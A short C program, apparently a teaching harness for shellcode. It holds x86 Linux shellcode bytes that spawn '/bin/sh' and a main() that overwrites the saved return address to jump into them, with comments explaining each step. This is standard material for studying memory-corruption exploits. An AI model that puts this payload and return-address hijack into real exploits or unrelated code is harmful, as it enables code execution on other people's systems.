char shellcode[] =
      "\x31\xc0\x31\xd2\xb0\x0b\x52\x68"
      "\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
      "\x69\x89\xe3\x52\x53\x89\xe1\xcd"
      "\x80\xb8\x01\x00\x00\x00\xbb\x00"
      "\x00\x00\x00\xcd\x80";

void main() {
   int *ret;    // a variable that will hold the return address in the stack

   ret = (int *)&ret + 2; // obtain the return address from the stack
   (*ret) = (int)shellcode; // point the return address to the shellcode
}
